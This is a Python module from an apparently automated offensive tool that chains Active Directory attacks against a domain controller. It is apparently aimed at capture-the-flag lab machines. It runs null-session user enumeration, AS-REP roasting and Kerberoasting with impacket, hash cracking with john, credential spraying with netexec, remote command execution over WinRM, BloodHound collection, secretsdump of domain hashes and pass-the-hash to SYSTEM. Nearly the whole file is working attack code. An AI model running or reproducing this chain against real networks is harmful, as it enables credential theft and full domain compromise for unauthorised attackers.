"""Active Directory attack chain — the agent that unblocks 'anonymous LDAP bind'.

Most AD boxes dead-end scryer at "anonymous bind, here's a user list." This
module drives the standard no-creds-to-shell chain as an ordered plan, feeding
each stage's output into the next:

    enumerate users (LDAP / RID-brute / info-field mining)
      -> AS-REP roast (GetNPUsers, no creds) -> crack (john + rockyou)
      -> password-spray recovered/mined creds (netexec)
      -> with a valid login: read the user flag over WinRM, Kerberoast
         (GetUserSPNs) -> crack, collect BloodHound, and pool every credential
         so the Windows-attack + reuse passes can take it to SYSTEM.

Read-only enumeration + roasting always run; spraying only replays credentials
scryer actually recovered (cracked hashes, mined description/info values), so it
won't lock accounts against a wordlist. netexec is the workhorse, impacket +
john the crackers; every stage degrades to a printed command if a tool is
missing.
"""

from __future__ import annotations

import os
import re
import shutil
from typing import List, Optional, Set, Tuple

from ...core import utils, tooling
from ...core.report import HostReport, Finding

_ASREP_RE = re.compile(r"\$krb5asrep\$[^\s]+")
_TGS_RE = re.compile(r"\$krb5tgs\$[^\s]+")
# netexec success line: "SMB  ip  445  DC  [+] domain\user:pass (Pwn3d!)"
_NXC_OK = re.compile(r"\[\+\]\s+([^\\\s]+)\\([^:\s]+):(\S+?)(\s+\(Pwn3d!\))?\s*$")


def run(host: HostReport, opts) -> None:
    if not _is_dc(host):
        return
    ip = host.resolved_ip or host.target
    domain = _domain(host)
    if not domain:
        return
    base_dn = host.__dict__.get("ad_base_dn", "")
    utils.section(f"AD ATTACK {domain} ({ip})")

    users = _collect_users(host, ip, domain, base_dn)
    if users:
        _write_users(host, ip, users)
    else:
        utils.log("dim", "no users enumerated (anonymous access locked down) — "
                         "try kerbrute with a name list", indent=1)

    # AS-REP roast needs no creds; always worth a shot.
    _asrep_roast(host, ip, domain, users)

    # Spray only the credentials scryer actually recovered/mined (low lockout
    # risk), across the enumerated users. This is where a cracked AS-REP hash or
    # a description-field password turns into a validated login.
    valid = _spray(host, ip, domain, users)

    for dom, user, pw, admin in valid:
        _post_creds(host, ip, dom or domain, user, pw, admin, opts)


# --------------------------------------------------------------------------
# stage 1 — user enumeration
# --------------------------------------------------------------------------
def _collect_users(host, ip, domain, base_dn) -> List[str]:
    users = list(host.__dict__.get("ad_users", []))
    nxc = tooling.resolve("netexec")
    if nxc and len(users) < 3:
        # RID cycling over a null session — recovers users when LDAP is stingy.
        rc, out, _ = utils.run([nxc, "smb", ip, "-u", "", "-p", "", "--rid-brute"],
                               timeout=90)
        for m in re.finditer(r"[^\s\\]+\\([\w.$-]+)\s+\(SidTypeUser\)", out or ""):
            users.append(m.group(1))
        # LDAP --users (may work anonymously)
        rc, out, _ = utils.run([nxc, "ldap", ip, "-u", "", "-p", "", "--users"],
                               timeout=60)
        for m in re.finditer(r"^\s*LDAP\s+\S+\s+\d+\s+\S+\s+([\w.$-]+)\s",
                             out or "", re.M):
            users.append(m.group(1))
    # dedupe, drop machine accounts ending in $
    seen, out_users = set(), []
    for u in users:
        u = u.strip()
        if u and not u.endswith("$") and u.lower() not in seen:
            seen.add(u.lower())
            out_users.append(u)
    if out_users:
        utils.log("good", f"{len(out_users)} AD user(s): "
                          f"{', '.join(out_users[:15])}"
                          + (" …" if len(out_users) > 15 else ""), indent=1)
    return out_users


def _write_users(host, ip, users) -> None:
    try:
        d = os.path.join(os.getcwd(), "scryer_loot", ip)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "ad_users.txt"), "w") as fh:
            fh.write("\n".join(users) + "\n")
    except OSError:
        pass


# --------------------------------------------------------------------------
# stage 2 — AS-REP roast (no creds)
# --------------------------------------------------------------------------
def _asrep_roast(host, ip, domain, users) -> None:
    getnp = _impacket("GetNPUsers")
    if not getnp:
        return
    uf = _userfile(ip, users) if users else None
    cmd = getnp + [f"{domain}/", "-dc-ip", ip, "-no-pass", "-format", "hashcat"]
    cmd += ["-usersfile", uf] if uf else ["-request"]
    rc, out, err = utils.run(cmd, timeout=120)
    hashes = _ASREP_RE.findall((out or "") + (err or ""))
    if not hashes:
        return
    utils.log("hot", f"AS-REP roastable: {len(hashes)} account(s) with pre-auth "
                     "disabled", indent=1)
    for h in hashes:
        acct = _acct_from_hash(h)
        host.add(Finding(
            title=f"AS-REP roastable account: {acct}",
            detail=f"{acct} has Kerberos pre-auth disabled — crackable offline "
                   "with no credentials (hashcat -m 18200).", severity="high",
            category="cred", port=88, service="kerberos", evidence=h))
    _crack_kerb(host, hashes, "AS-REP", 18200)


# --------------------------------------------------------------------------
# stage 3 — spray recovered/mined credentials
# --------------------------------------------------------------------------
def _spray(host, ip, domain, users) -> List[Tuple[str, str, str, bool]]:
    nxc = tooling.resolve("netexec")
    creds = list(dict.fromkeys(host.creds))
    if not nxc or not creds:
        return []
    uf = _userfile(ip, users) if users else None
    valid: List[Tuple[str, str, str, bool]] = []
    seen: Set[Tuple[str, str]] = set()
    for pw in creds[:12]:
        targets = uf and ["-u", uf] or ["-u", (users or [""])[0]]
        if not users and not uf:
            break
        rc, out, _ = utils.run(
            [nxc, "smb", ip, *targets, "-p", pw, "-d", domain,
             "--continue-on-success"], timeout=120)
        for line in (out or "").splitlines():
            m = _NXC_OK.search(line)
            if not m:
                continue
            dom, user, gotpw, admin = m.group(1), m.group(2), m.group(3), bool(m.group(4))
            if gotpw != pw or (user, pw) in seen:
                continue
            seen.add((user, pw))
            valid.append((dom, user, pw, admin))
            tag = "  (Pwn3d! — admin)" if admin else ""
            utils.log("hot", f"valid AD credential: {dom}\\{user}:{pw}{tag}",
                      indent=1)
            host.add_cred(pw)
            host.add(Finding(
                title=f"Valid AD credential: {user}" + (" (admin)" if admin else ""),
                detail=f"{dom}\\{user}:{pw} (confirmed over SMB). "
                       + ("Local admin — dump with secretsdump / psexec for "
                          "SYSTEM." if admin else "Use for WinRM, Kerberoast, "
                          "BloodHound, and further spraying."),
                severity="critical" if admin else "high", category="cred",
                port=445, service="smb", evidence=f"{dom}\\{user}:{pw}"))
    return valid


# --------------------------------------------------------------------------
# stage 4 — post-credential: flag, kerberoast, bloodhound
# --------------------------------------------------------------------------
def _post_creds(host, ip, domain, user, pw, admin, opts) -> None:
    nxc = tooling.resolve("netexec")
    # WinRM shell -> user/root flag
    if nxc:
        rc, out, _ = utils.run(
            [nxc, "winrm", ip, "-u", user, "-p", pw, "-d", domain, "-X",
             "Get-ChildItem C:\\Users\\*\\Desktop\\*.txt,"
             "C:\\Users\\*\\*.txt -Recurse -EA 0 | "
             "%{Get-Content $_.FullName -EA 0}"], timeout=90)
        if "Pwn3d!" in (out or "") or "(Pwn3d" in (out or ""):
            utils.log("hot", f"WinRM access as {user} — evil-winrm -i {ip} "
                             f"-u {user} -p '{pw}'", indent=1)
        _grab_flags(host, out or "", f"WinRM {user}", ip)

    # Kerberoast with the new creds
    _kerberoast(host, ip, domain, user, pw)

    # BloodHound collection (data for the operator to open in the UI)
    if nxc:
        rc, out, _ = utils.run(
            [nxc, "ldap", ip, "-u", user, "-p", pw, "-d", domain,
             "--bloodhound", "-c", "all", "--dns-server", ip], timeout=180)
        m = re.search(r"(\S+\.zip)", out or "")
        if m:
            utils.log("good", f"BloodHound data collected: {m.group(1)} — import "
                             "into BloodHound and run the shortest-path queries",
                      indent=1)
            host.add(Finding(
                title="BloodHound data collected", detail=m.group(1),
                severity="info", category="host", port=389, service="ldap"))

    if admin:
        _secretsdump(host, ip, domain, user, pw)


def _kerberoast(host, ip, domain, user, pw) -> None:
    spn = _impacket("GetUserSPNs")
    if not spn:
        return
    rc, out, err = utils.run(
        spn + [f"{domain}/{user}:{pw}", "-dc-ip", ip, "-request",
               "-outputfile", os.path.join("/tmp", "scryer_tgs.txt")],
        timeout=120)
    hashes = _TGS_RE.findall((out or "") + (err or ""))
    if not hashes:
        # outputfile may hold them
        try:
            hashes = _TGS_RE.findall(open("/tmp/scryer_tgs.txt").read())
        except OSError:
            pass
    if hashes:
        utils.log("hot", f"Kerberoast: {len(hashes)} SPN hash(es)", indent=1)
        _crack_kerb(host, hashes, "Kerberoast", 13100)


def _secretsdump(host, ip, domain, user, pw) -> None:
    dump = _impacket("secretsdump")
    if not dump:
        return
    utils.log("info", f"secretsdump as admin {user} — dumping the domain "
                      "NTDS/SAM", indent=1)
    rc, out, _ = utils.run(dump + [f"{domain}/{user}:{pw}@{ip}"], timeout=180)
    # Administrator NT hash -> pass-the-hash to SYSTEM
    for m in re.finditer(r"^([\w$.-]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::",
                         out or "", re.M):
        acct, nt = m.group(1), m.group(2)
        if acct.lower() in ("administrator", "admin"):
            utils.log("hot", f"{acct} NT hash: {nt} — pass-the-hash: "
                             f"impacket-psexec -hashes :{nt} {domain}/{acct}@{ip}",
                      indent=2)
            host.add(Finding(
                title=f"Domain hash dumped: {acct}",
                detail=f"{acct}:{nt} (NTDS). Pass-the-hash: impacket-psexec "
                       f"-hashes :{nt} {domain}/{acct}@{ip} -> SYSTEM + root flag.",
                severity="critical", category="cred", port=445, service="smb",
                evidence=f"{acct}:{nt}"))


# --------------------------------------------------------------------------
# cracking
# --------------------------------------------------------------------------
def _crack_kerb(host, hashes, label, hashcat_mode) -> None:
    john = tooling.resolve("john")
    wl = tooling.crack_wordlist()
    if not john or not wl:
        utils.log("dim", f"{label}: {len(hashes)} hash(es) — crack with "
                         f"`hashcat -m {hashcat_mode} <hashes> rockyou.txt`",
                  indent=2)
        return
    path = os.path.join("/tmp", f"scryer_{label.lower()}.txt")
    try:
        with open(path, "w") as fh:
            fh.write("\n".join(hashes) + "\n")
    except OSError:
        return
    utils.run([john, f"--wordlist={wl}", path], timeout=240)
    rc, out, _ = utils.run([john, "--show", path], timeout=30)
    for line in (out or "").splitlines():
        # john --show:  $krb5asrep$...user...:PASSWORD
        if ":" in line and "$krb5" in line:
            pw = line.rsplit(":", 1)[-1].strip()
            acct = _acct_from_hash(line)
            if pw and pw != "0" and "password hash" not in line:
                utils.log("hot", f"cracked {label} {acct}: {pw}", indent=2)
                host.add_cred(pw)
                host.add(Finding(
                    title=f"Cracked {label} credential: {acct}",
                    detail=f"{acct}:{pw} (cracked from {label} hash). Spray it / "
                           "use it for WinRM + Kerberoast.", severity="critical",
                    category="cred", port=88, service="kerberos",
                    evidence=f"{acct}:{pw}"))


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------
def _is_dc(host) -> bool:
    ports = {e["port"] for e in host.open_ports}
    return 88 in ports and bool({389, 445, 636, 3268} & ports)


def _domain(host) -> str:
    d = host.__dict__.get("ad_domain")
    if d:
        return d
    for name in host.hostnames:
        if "." in name and not name.replace(".", "").isdigit():
            # prefer the bare domain (danglingtree.htb) over the DC FQDN
            parts = name.split(".")
            if len(parts) >= 2 and parts[0] not in ("dc", "dc01", "dc02"):
                return name
    # fall back to stripping the DC label off an FQDN
    for name in host.hostnames:
        if name.count(".") >= 2:
            return name.split(".", 1)[1]
    return ""


def _impacket(name: str) -> Optional[List[str]]:
    for cand in (f"impacket-{name}", f"{name}.py", name):
        p = shutil.which(cand)
        if p:
            return [p]
    # example script under an impacket install, run with python
    for base in ("/usr/share/doc/python3-impacket/examples",
                 os.path.expanduser("~/.local/share/impacket/examples")):
        script = os.path.join(base, f"{name}.py")
        if os.path.isfile(script):
            return ["python3", script]
    return None


def _userfile(ip: str, users: List[str]) -> Optional[str]:
    if not users:
        return None
    path = os.path.join("/tmp", f"scryer_adusers_{ip.replace('.', '_')}.txt")
    try:
        with open(path, "w") as fh:
            fh.write("\n".join(users) + "\n")
        return path
    except OSError:
        return None


def _acct_from_hash(h: str) -> str:
    m = re.search(r"\$krb5(?:asrep|tgs)\$(?:\d+\$)?\*?([^*$@:]+)", h)
    if m and "@" not in m.group(1):
        return m.group(1)
    m = re.search(r"([A-Za-z0-9._-]+)@", h)
    return m.group(1) if m else "?"


def _grab_flags(host, blob, source, ip) -> None:
    from ...data import knowledge
    for tok in knowledge.find_flags(blob or "", allow_hex=True):
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c(f"║ FLAG ({source})", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(
            title=f"FLAG via {source}", detail=tok, severity="critical",
            category="flag", port=5985, service="winrm",
            evidence=f"{source}: {tok}"))
